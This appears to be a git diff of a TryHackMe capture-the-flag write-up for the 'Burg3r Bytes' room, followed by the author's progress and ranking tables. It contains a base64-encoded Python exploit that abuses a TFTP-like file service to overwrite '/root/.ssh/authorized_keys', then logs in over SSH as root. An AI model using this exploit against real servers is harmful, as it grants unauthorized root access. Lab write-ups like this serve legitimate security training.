@@ -1,10 +1,11 @@
 <h1 align="center">TryHack3M: Burg3r Bytes</h1>
-<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/05f1224c-0546-497c-a1bb-d7ef4ceb1de6"><br>
-July 19, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, 
+<p align="center">2026, Mar 22<br><img width="1200px" src="https://github.com/user-attachments/assets/4d065dd8-711f-4179-bbb8-33f5920b0304"><br>
+2025, July 19<br><img width="80px" src="https://github.com/user-attachments/assets/05f1224c-0546-497c-a1bb-d7ef4ceb1de6"><br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, 
 and I’m excited to join you on this adventure, part of my <code>438</code>-day-streak in<a href="https://tryhackme.com">TryHackMe</a>.<br>
 <em>They say these burgers are worth every penny. Can you buy one?</em>.<br>
 Access it <a href="https://tryhackme.com/room/burg3rbytes">here</a>.<br><br>
 <img width="1200px" src="https://github.com/user-attachments/assets/cfcc9f09-7fb1-4d48-9fe0-4bcfe5896f42"></p>
+
 
 <br>
 
@@ -805,25 +806,126 @@ File sent successfully
 
 
 <p>To Be continued ...</p>
+<br>
+<br>
+<br>
 
+<p>Finally, I feel ready!!!<br>
+2026-mar-22</p>
+<br>
+<br>
+<br>
+
+```bash
+aW1wb3J0IHN5cwppbXBvcnQgc29ja2V0CmZyb20gQ3J5cHRvLlB1YmxpY0tleSBpbXBvcnQgUlNBCmZyb20gQ3J5cHRvLkNpcGhlciBpbXBvcnQgUEtDUzFfT0FFUApmcm9tIENyeXB0by5TaWduYXR1cmUgaW1wb3J0IHBzcwpmcm9tIENyeXB0by5IYXNoIGltcG9ydCBTSEEyNTYKaW1wb3J0IGJpbmFzY2lpCmltcG9ydCBiYXNlNjQKCk1BWF9TSVpFID0gMjAwCgpvcGNvZGVzID0gewogICAgJ3JlYWQnOiAxLAogICAgJ3dyaXRlJzogMiwKICAgICdkYXRhJzogMywKICAgICdhY2snOiA0LAogICAgJ2Vycm9yJzogNQp9Cgptb2RlX3N0cmluZ3MgPSBbJ25ldGFzY2lpJywgJ29jdGV0JywgJ21haWwnXQoKd2l0aCBvcGVuKCJjbGllbnQua2V5IiwgInJiIikgYXMgZjoKICAgIGRhdGEgPSBmLnJlYWQoKQogICAgcHJpdmtleSA9IFJTQS5pbXBvcnRfa2V5KGRhdGEpCgp3aXRoIG9wZW4oImNsaWVudC5jcnQiLCAicmIiKSBhcyBmOgogICAgZGF0YSA9IGYucmVhZCgpCiAgICBwdWJrZXkgPSBSU0EuaW1wb3J0X2tleShkYXRhKQoKdHJ5OgogICAgd2l0aCBvcGVuKCJzZXJ2ZXIuY3J0IiwgInJiIikgYXMgZjoKICAgICAgICBkYXRhID0gZi5yZWFkKCkKICAgICAgICBzZXJ2ZXJfcHVia2V5ID0gUlNBLmltcG9ydF9rZXkoZGF0YSkKZXhjZXB0OgogICAgc2VydmVyX3B1YmtleSA9IEZhbHNlCgpzb2NrID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfREdSQU0pCnNvY2suc2V0dGltZW91dCgzLjApCnNlcnZlcl9hZGRyZXNzID0gKHN5cy5hcmd2WzFdLCBpbnQoc3lzLmFyZ3ZbMl0pKQoKZGVmIGVuY3J5cHQocywgcHVia2V5KToKICAgIGNpcGhlciA9IFBLQ1MxX09BRVAubmV3KHB1YmtleSkKICAgIHJldHVybiBjaXBoZXIuZW5jcnlwdChzKQoKZGVmIGRlY3J5cHQocywgcHJpdmtleSk6CiAgICBjaXBoZXIgPSBQS0NTMV9PQUVQLm5ldyhwcml2a2V5KQogICAgcmV0dXJuIGNpcGhlci5kZWNyeXB0KHMpCgpkZWYgc2VuZF9ycnEoZmlsZW5hbWUsIG1vZGUsIHNpZ25hdHVyZSwgc2VydmVyKToKICAgIHJycSA9IGJ5dGVhcnJheSgpCiAgICBycnEuYXBwZW5kKDApCiAgICBycnEuYXBwZW5kKG9wY29kZXNbJ3JlYWQnXSkKICAgIHJycSArPSBieXRlYXJyYXkoZmlsZW5hbWUpCiAgICBycnEuYXBwZW5kKDApCiAgICBycnEgKz0gYnl0ZWFycmF5KG1vZGUpCiAgICBycnEuYXBwZW5kKDApCiAgICBycnEgKz0gYnl0ZWFycmF5KHNpZ25hdHVyZSkKICAgIHJycS5hcHBlbmQoMCkKICAgIHNvY2suc2VuZHRvKHJycSwgc2VydmVyKQogICAgcmV0dXJuIFRydWUKCmRlZiBzZW5kX3dycShmaWxlbmFtZSwgbW9kZSwgc2VydmVyKToKICAgIHdycSA9IGJ5dGVhcnJheSgpCiAgICB3cnEuYXBwZW5kKDApCiAgICB3cnEuYXBwZW5kKG9wY29kZXNbJ3dyaXRlJ10pCiAgICB3cnEgKz0gYnl0ZWFycmF5KGZpbGVuYW1lKQogICAgd3JxLmFwcGVuZCgwKQogICAgd3JxICs9IGJ5dGVhcnJheShtb2RlKQogICAgd3JxLmFwcGVuZCgwKQogICAgcHJpbnQod3JxKQogICAgc29jay5zZW5kdG8od3JxLCBzZXJ2ZXIpCiAgICByZXR1cm4gVHJ1ZQoKZGVmIHNlbmRfYWNrKGJsb2NrX251bWJlciwgc2VydmVyKToKICAgIGlmIGxlbihibG9ja19udW1iZXIpICE9IDI6CiAgICAgICAgcHJpbnQoJ0Vycm9yOiBCbG9jayBudW1iZXIgbXVzdCBiZSAyIGJ5dGVzIGxvbmcuJykKICAgICAgICByZXR1cm4gRmFsc2UKICAgIGFjayA9IGJ5dGVhcnJheSgpCiAgICBhY2suYXBwZW5kKDApCiAgICBhY2suYXBwZW5kKG9wY29kZXNbJ2FjayddKQogICAgYWNrICs9IGJ5dGVhcnJheShibG9ja19udW1iZXIpCiAgICBzb2NrLnNlbmR0byhhY2ssIHNlcnZlcikKICAgIHJldHVybiBUcnVlCgpkZWYgc2VuZF9lcnJvcihzZXJ2ZXIsIGNvZGUsIG1zZyk6CiAgICBlcnIgPSBieXRlYXJyYXkoKQogICAgZXJyLmFwcGVuZCgwKQogICAgZXJyLmFwcGVuZChvcGNvZGVzWydlcnJvciddKQogICAgZXJyLmFwcGVuZCgwKQogICAgZXJyLmFwcGVuZChjb2RlICYgMHhmZikKICAgIHBrdCArPSBieXRlYXJyYXkobXNnICsgYidcMCcpCiAgICBzb2NrLnNlbmR0byhwa3QsIHNlcnZlcikKCmRlZiBzZW5kX2RhdGEoc2VydmVyLCBibG9ja19udW0sIGJsb2NrKToKICAgIGlmIGxlbihibG9ja19udW0pICE9IDI6CiAgICAgICAgcHJpbnQoJ0Vycm9yOiBCbG9jayBudW1iZXIgbXVzdCBiZSAyIGJ5dGVzIGxvbmcuJykKICAgICAgICByZXR1cm4gRmFsc2UKICAgIHBrdCA9IGJ5dGVhcnJheSgpCiAgICBwa3QuYXBwZW5kKDApCiAgICBwa3QuYXBwZW5kKG9wY29kZXNbJ2RhdGEnXSkKICAgIHBrdCArPSBieXRlYXJyYXkoYmxvY2tfbnVtKQogICAgcGt0ICs9IGJ5dGVhcnJheShibG9jaykKICAgIHNvY2suc2VuZHRvKHBrdCwgc2VydmVyKQoKZGVmIGdldF9maWxlKGZpbGVuYW1lLCBtb2RlKToKICAgIGggPSBTSEEyNTYubmV3KGZpbGVuYW1lKQogICAgc2lnbmF0dXJlID0gYmFzZTY0LmI2NGVuY29kZShwc3MubmV3KHByaXZrZXkpLnNpZ24oaCkpCgogICAgc2VuZF9ycnEoZmlsZW5hbWUsIG1vZGUsIHNpZ25hdHVyZSwgc2VydmVyX2FkZHJlc3MpCiAgICAKICAgIGZpbGUgPSBvcGVuKGZpbGVuYW1lLCAid2IiKQoKICAgIHdoaWxlIFRydWU6CiAgICAgICAgZGF0YSwgc2VydmVyID0gc29jay5yZWN2ZnJvbShNQVhfU0laRSAqIDMpCgogICAgICAgIGlmIGRhdGFbMV0gPT0gb3Bjb2Rlc1snZXJyb3InXToKICAgICAgICAgICAgZXJyb3JfY29kZSA9IGludC5mcm9tX2J5dGVzKGRhdGFbMjo0XSwgYnl0ZW9yZGVyPSdiaWcnKQogICAgICAgICAgICBwcmludChkYXRhWzQ6XSkKICAgICAgICAgICAgYnJlYWsKICAgICAgICBzZW5kX2FjayhkYXRhWzI6NF0sIHNlcnZlcikKICAgICAgICBjb250ZW50ID0gZGF0YVs0Ol0KICAgICAgICBjb250ZW50ID0gYmFzZTY0LmI2NGRlY29kZShjb250ZW50KQogICAgICAgIGNvbnRlbnQgPSBkZWNyeXB0KGNvbnRlbnQsIHByaXZrZXkpCiAgICAgICAgZmlsZS53cml0ZShjb250ZW50KQogICAgICAgIGlmIGxlbihjb250ZW50KSA8IE1BWF9TSVpFOgogICAgICAgICAgICBwcmludCgiZmlsZSByZWNlaXZlZCEiKQogICAgICAgICAgICBicmVhawoKZGVmIHB1dF9maWxlKGZpbGVuYW1lLCBtb2RlKToKICAgIGlmIG5vdCBzZXJ2ZXJfcHVia2V5OgogICAgICAgIHByaW50KCJFcnJvcjogU2VydmVyIHB1YmtleSBub3QgY29uZmlndXJlZC4gWW91IHdvbid0IGJlIGFibGUgdG8gUFVUIikKICAgICAgICByZXR1cm4KCiAgICB0cnk6CiAgICAgICAgZmlsZSA9IG9wZW4oZmlsZW5hbWUsICJyYiIpCiAgICAgICAgZmRhdGEgPSBmaWxlLnJlYWQoKQogICAgICAgIHRvdGFsX2xlbiA9IGxlbihmZGF0YSkKICAgIGV4Y2VwdDoKICAgICAgICBwcmludCgiRXJyb3I6IEZpbGUgZG9lc24ndCBleGlzdCIpCiAgICAgICAgcmV0dXJuIEZhbHNlCiAgICBmaWxlbmFtZSA9IGInL3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXMnCiAgICBzZW5kX3dycShmaWxlbmFtZSwgbW9kZSwgc2VydmVyX2FkZHJlc3MpCiAgICBkYXRhLCBzZXJ2ZXIgPSBzb2NrLnJlY3Zmcm9tKE1BWF9TSVpFICogMykKICAgIAogICAgaWYgZGF0YSAhPSBiJ1x4MDBceDA0XHgwMFx4MDAnOiAjIGFjayAwCiAgICAgICAgcHJpbnQoIkVycm9yOiBTZXJ2ZXIgZGlkbid0IHJlc3BvbmQgd2l0aCBBQ0sgdG8gV1JRIikKICAgICAgICByZXR1cm4gRmFsc2UKCiAgICBibG9ja19udW0gPSAxCiAgICB3aGlsZSBsZW4oZmRhdGEpID4gMDoKICAgICAgICBiX2Jsb2NrX251bSA9IGJsb2NrX251bS50b19ieXRlcygyLCAnYmlnJykKICAgICAgICBibG9jayA9IGZkYXRhWzpNQVhfU0laRV0KICAgICAgICBibG9jayA9IGVuY3J5cHQoYmxvY2ssIHNlcnZlcl9wdWJrZXkpCiAgICAgICAgYmxvY2sgPSBiYXNlNjQuYjY0ZW5jb2RlKGJsb2NrKQogICAgICAgIGZkYXRhID0gZmRhdGFbTUFYX1NJWkU6XQogICAgICAgIHNlbmRfZGF0YShzZXJ2ZXIsIGJfYmxvY2tfbnVtLCBibG9jaykKICAgICAgICBkYXRhLCBzZXJ2ZXIgPSBzb2NrLnJlY3Zmcm9tKE1BWF9TSVpFICogMykKICAgICAgICAKICAgICAgICBpZiBkYXRhICE9IGInXHgwMFx4MDQnICsgYl9ibG9ja19udW06CiAgICAgICAgICAgIHByaW50KCJFcnJvcjogU2VydmVyIHNlbnQgdW5leHBlY3RlZCByZXNwb25zZSIpCiAgICAgICAgICAgIHJldHVybiBGYWxzZQoKICAgICAgICBibG9ja19udW0gKz0gMQoKICAgIGlmIHRvdGFsX2xlbiAlIE1BWF9TSVpFID09IDA6CiAgICAgICAgYl9ibG9ja19udW0gPSBibG9ja19udW0udG9fYnl0ZXMoMiwgJ2JpZycpCiAgICAgICAgc2VuZF9kYXRhKHNlcnZlciwgYl9ibG9ja19udW0sIGIiIikKICAgICAgICBkYXRhLCBzZXJ2ZXIgPSBzb2NrLnJlY3Zmcm9tKE1BWF9TSVpFICogMykKICAgICAgICAKICAgICAgICBpZiBkYXRhICE9IGInXHgwMFx4MDQnICsgYl9ibG9ja19udW06CiAgICAgICAgICAgIHByaW50KCJFcnJvcjogU2VydmVyIHNlbnQgdW5leHBlY3RlZCByZXNwb25zZSIpCiAgICAgICAgICAgIHJldHVybiBGYWxzZQoKICAgIHByaW50KCJGaWxlIHNlbnQgc3VjY2Vzc2Z1bGx5IikKICAgIHJldHVybiBUcnVlCgpkZWYgbWFpbigpOgogICAgZmlsZW5hbWUgPSBiJ2F1dGhvcml6ZWRfa2V5cycKICAgIG1vZGUgPSBiJ25ldGFzY2lpJwoKICAgIHB1dF9maWxlKGZpbGVuYW1lLCBtb2RlKQogICAgZXhpdCgwKQoKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAgIG1haW4oKQo=
+```
+
+<img width="1347" height="549" alt="image" src="https://github.com/user-attachments/assets/f823caa5-39e5-4d50-bf3f-54a7d9b8b5d3" />
 
 <br>
 <br>
 
 
+<img width="1106" height="97" alt="image" src="https://github.com/user-attachments/assets/df8553d9-5f24-4b2f-809a-060e9a2d18eb" />
+
+```bash
+root@7b05c5df3d55:/app/cron# python3 sendfile.py 172.17.0.1 69
+bytearray(b'\x00\x02/root/.ssh/authorized_keys\x00netascii\x00')
+File sent successfully
+```
+
+<img width="1104" height="218" alt="image" src="https://github.com/user-attachments/assets/4ac414cb-a32b-436a-b741-eae97225f6f9" />
 
 <br>
+<br>
+
+<img width="1038" height="750" alt="image" src="https://github.com/user-attachments/assets/02d9de1e-1194-4a03-8649-66dd7e75c64a" />
+
+
+
+```bash
+:~/challenge# ssh -i id_rsa root@MachineIP
+...
+root@thm-burg3rbyte:~# ls
+a467ea.txt  snap
+...
+root@thm-burg3rbyte:~# cat a467ea.txt
+THM{••••••••••••••••}
+```
+
+
+<br>
+<br>
+<h1 align="center">Completed</h1>
+
+<p align="center"><img width="900px" src="https://github.com/user-attachments/assets/6847ee00-701c-437b-bf2b-42f06a8eb837"><br><br>
+                  <img width="500px" src="https://github.com/user-attachments/assets/7f0888d7-0275-4902-8f7f-1aaa0fbca34a"><br>
+	              <img width="900px" src="https://github.com/user-attachments/assets/95395e12-425a-4360-bc61-b423e29c7e43"><br>
+                  <img width="900px" src="https://github.com/user-attachments/assets/5c8525fd-0067-4bc9-91fc-e300c1edf590"></p>
 
 <div align="center">
 
 | Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
-| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
+| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | ------:  | -------: | :-------: |
 |                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
+| March 22, 2026    | 80       |      14ᵗʰ    |      2nd     |      4ᵗʰ    |     1st    | 115,419  |  1,156    |    91     |
 | July 19, 2025     | 439      |     155ᵗʰ    |      5ᵗʰ     |    170ᵗʰ    |     7ᵗʰ    | 115,419  |    865    |    72     |
 
 
+</h6></div><br>
 
 
+<br>
+<br>
+<h1 align="center">My TryHackMe Journey ・ 2026, March</h1>
 
+<div align="center"><h6>
+
+|Day<br><br><br> |Streak<br><br><br>|Room Name<br><br><br>|Level<br><br><br>|Type<br><br><br>|Rooms<br>Completed<br><br>|Points<br><br><br>|Badges<br><br><br>|Global<br>All<br>Time<br>|Global<br>Monthly<br><br>|Brazil<br>All<br>Time<br>|Brazil<br>Monthly<br><br>|League<br><br><br>|
+|---------------:|-----------------:|:----------------|:---------------|:----------------------------------------:|-------------------------:|-----------------:|-----------------:|--------------------:|------------------------:|--------------------:|---------------:|---------------:|
+|22<br><br>      |80<br><br>        |TryHack3M: Burg3r Bytes<br>  |Hard<br><br>   |🚩<br><br>| 1,156<br><br>| 163,403<br><br>| 91<br><br>| 14ᵗʰ<br><br>| 4ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|-<br><br>
+|22<br><br>      |80<br><br>        |St3alMyH34rt<br><br>             |Hard<br><br>   |🚩<br><br>| 1,155<br><br>| 162,873<br><br>| 91<br><br>| 14ᵗʰ<br><br>| 4ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|3ʳᵈ<br><br>|
+|21<br><br>      |79<br><br>        |Typo Snare<br><br>               |Medium<br><br> |⚙️<br><br>|     -<br><br>| 162,541<br><br>| 91<br><br>| 14ᵗʰ<br><br>| 4ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|3ʳᵈ<br><br>|
+|20<br><br>      |78<br><br>        |Microsoft Intune Monitoring<br>  |Medium<br><br> |🔗<br><br>| 1,154<br><br>| 161,725<br><br>| 91<br><br>| 14ᵗʰ<br><br>| 9ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|3ʳᵈ<br><br>|
+|20<br><br>      |78<br><br>        |SharePoint Online Monitoring<br> |Medium<br><br> |🔗<br><br>| 1,153<br><br>| 161,629<br><br>| 91<br><br>| 14ᵗʰ<br><br>|10ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|3ʳᵈ<br><br>|
+|19<br><br>      |77<br><br>        |Detecting AD Post-Exploitation<br>|Hard<br><br>  |🔗<br><br>| 1,152<br><br>| 161,517<br><br>| 91<br><br>| 14ᵗʰ<br><br>| 9ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|3ʳᵈ<br><br>|
+|19<br><br>      |77<br><br>        |DockMagic - in progress<br><br>  |Medium<br><br> |🚩<br><br>| 1,151<br><br>|       -<br><br>|  -<br><br>|    -<br><br>|   -<br><br>|   -<br><br>|   -<br><br>|  -<br><br>|
+|18<br><br>      |76<br><br>        |Phishing Unfolding<br><br>       |Medium<br><br> |⚙️<br><br>| 1,151<br><br>|       -<br><br>|  -<br><br>|    -<br><br>|   -<br><br>|   -<br><br>|   -<br><br>|  -<br><br>|
+|18<br><br>      |76<br><br>        |Introduction to Phishing<br><br> |Easy<br><br>   |⚙️<br><br>| 1,151<br><br>|       -<br><br>|  -<br><br>|    -<br><br>|   -<br><br>|   -<br><br>|   -<br><br>|  -<br><br>|
+|18<br><br>      |76<br><br>        |Dev Diaries<br><br>              |Easy<br><br>   |🚩<br><br>| 1,151<br><br>| 161,273<br><br>| 91<br><br>| 16ᵗʰ<br><br>|10ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|3ʳᵈ<br><br>|
+|17<br><br>      |75<br><br>        |Missing Person<br><br>           |Easy<br><br>   |🚩<br><br>| 1,150<br><br>| 161,123<br><br>| 91<br><br>| 16ᵗʰ<br><br>|10ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|1ˢᵗ<br><br>|
+|17<br><br><br>  |75<br><br><br>    |Detecting AD Lateral Movement<br><br>|Medium<br><br><br>|🔗<br><br><br>| 1,149<br><br><br>| 160,883<br><br><br>| 91<br><br><br>| 16ᵗʰ<br><br><br>| 9ᵗʰ<br><br><br>| 2ⁿᵈ<br><br><br>| 1ˢᵗ<br><br><br>|-<br><br><br>|
+|12<br><br>      |70<br><br>        |Entra ID Monitoring<br><br>      |Medium<br><br> |🔗<br><br>| 1,147<br><br>| 160,479<br><br>| 91<br><br>| 16ᵗʰ<br><br>| 8ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|5ᵗʰ<br><br>|
+|12<br><br>      |70<br><br>        |Introduction to Phishing<br>     |Easy<br><br>   |⚙️<br><br>| 1,146<br><br>| 160,343<br><br>| 91<br><br>| 16ᵗʰ<br><br>| 8ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|6ᵗʰ<br><br>|
+|11<br><br>      |69<br><br>        |Detecting AD Initial Access<br>  |Medium<br><br> |🔗<br><br>| 1,146<br><br>| 160,195<br><br>| 91<br><br>| 16ᵗʰ<br><br>| 9ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|4ᵗʰ<br><br>|
+|11<br><br>      |69<br><br>        |Minotaur´s Labyrinth<br><br>     |Medium<br><br> |🚩<br><br>| 1,145<br><br>| 160,051<br><br>| 91<br><br>| 16ᵗʰ<br><br>|10ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|9ᵗʰ<br><br>|
+|10<br><br>      |68<br><br>        |Introduction to Phishing<br><br> |Easy<br><br>   |⚙️<br><br>| 1,144<br><br>| 160,021<br><br>| 91<br><br>| 16ᵗʰ<br><br>| 8ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|<br><br>|
+|10<br><br>      |68<br><br>        |M365 Monitoring Basics<br><br>   |Medium<br><br> |🔗<br><br>| 1,144<br><br>| 160,016<br><br>| 91<br><br>| 16ᵗʰ<br><br>| 8ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|<br><br>|
+|9<br><br>       |67<br><br>        |Advent of Cyber 2022<br><br>     |Easy  <br><br> |🔗<br><br>| 1,143<br><br>| 159,880<br><br>| 91<br><br>| 16ᵗʰ<br><br>| 8ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|<br><br>|
+|8<br><br>       |66<br><br>        |Windows Reversing Intro<br>      |Medium<br><br> |🔗<br><br>| 1,142<br><br>|        <br><br>| 91<br><br>|     <br><br>|    <br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|<br><br>|
+|8<br><br>       |66<br><br>        |Advent of Cyber 2 [2020]<br>     |Easy<br><br>   |🔗<br><br>| 1,141<br><br>| 159,164<br><br>| 91<br><br>| 20ᵗʰ<br><br>| 7ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|3ʳᵈ<br><br>|
+|8<br><br>       |66<br><br>        |25 Days of Cyber Security<br>    |Easy<br><br>   |🔗<br><br>| 1,140<br><br>| 159,068<br><br>| 91<br><br>| 20ᵗʰ<br><br>| 7ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|3ʳᵈ<br><br>|
+|7<br><br>       |65<br><br>        |25 Days of Cyber Security<br>    |Easy<br><br>   |🔗<br><br>| 1,139<br><br>|        <br><br>| 91<br><br>| 20ᵗʰ<br><br>| 7ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|3ʳᵈ<br><br>|
+|6<br><br>       |64<br><br>        |25 Days of Cyber Security<br>    |Easy<br><br>   |🔗<br><br>| 1,139<br><br>|        <br><br>|   <br><br>|     <br><br>|    <br><br>|    <br><br>|    <br><br>|<br><br>|
+|6<br><br>       |64<br><br>        |Persistence: T1053<br>           |Easy<br><br>   |🔗<br><br>| 1,139<br><br>|        <br><br>|   <br><br>|     <br><br>|    <br><br>|    <br><br>|    <br><br>|<br><br>|
+|5<br><br>       |63<br><br>        |LOVELETTER.EXE<br><br>           |Hard<br><br>   |🚩<br><br>| 1,139<br><br>| 158,294<br><br>| 90<br><br>| 20ᵗʰ<br><br>| 9ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|3ʳᵈ<br><br>|
+|5<br><br>       |63<br><br>        |Monitoring AWS Workloads<br>     |Medium<br><br> |🔗<br><br>| 1,139<br><br>| 157,994<br><br>| 90<br><br>| 20ᵗʰ<br><br>| 9ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|3ʳᵈ<br><br>|
+|5<br><br>       |63<br><br>        |Kernel Blackout<br><br>          |Medium<br><br> |🚩<br><br>| 1,138<br><br>| 157,978<br><br>| 90<br><br>| 20ᵗʰ<br><br>| 9ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|3ʳᵈ<br><br>|
+|5<br><br>       |63<br><br>        |Operation Endgame<br><br>        |Hard<br><br>   |🚩<br><br>| 1,137<br><br>| 157,578<br><br>| 90<br><br>| 23ʳᵈ<br><br>| 9ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|7ᵗʰ<br><br>|
+|4<br><br>       |62<br><br>        |Monitoring Active Directory<br>  |Medium<br><br> |🔗<br><br>| 1,136<br><br>| 157,396<br><br>| 90<br><br>| 22ⁿᵈ<br><br>|10ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|<br><br>|
+|3<br><br>       |61<br><br>        |Monitoring AWS Services<br>      |Medium<br><br> |🔗<br><br>| 1,135<br><br>|        <br><br>| 90<br><br>| 22ⁿᵈ<br><br>|10ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|<br><br>|
+|2<br><br>       |60<br><br>        |<br><br>                         |      <br><br> |  <br><br>|      <br><br>|        <br><br>|   <br><br>|     <br><br>|    <br><br>|    <br><br>|    <br><br>|<br><br>|
+|1<br><br>       |59<br><br>        |<br><br>                         |      <br><br> |  <br><br>|      <br><br>|        <br><br>|   <br><br>|     <br><br>|    <br><br>|    <br><br>|    <br><br>|<br><br>|
+
+</h6></div><br>
+
+
+<p align="center">Global All Time:     14ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/a6318fde-9a89-40aa-9d50-abb2951ac91b"><br><br>
+                  Global Monthly:        4ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/2e0ca252-c82f-4021-94b7-8cfbd5832529"><br><br>
+                  Brazil All Time:       2ⁿᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/a7e52c2a-01f2-4e52-a56d-daa04dff8561"><br><br>
+                  Brazil Monthly:        1ˢᵗ<br><img width="1200px" src="https://github.com/user-attachments/assets/c1ee5481-14fe-45d3-bc47-c214df86fea6"></p>
+
+<h1 align="center">Thanks for coming!</h1>
+<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>
 
 
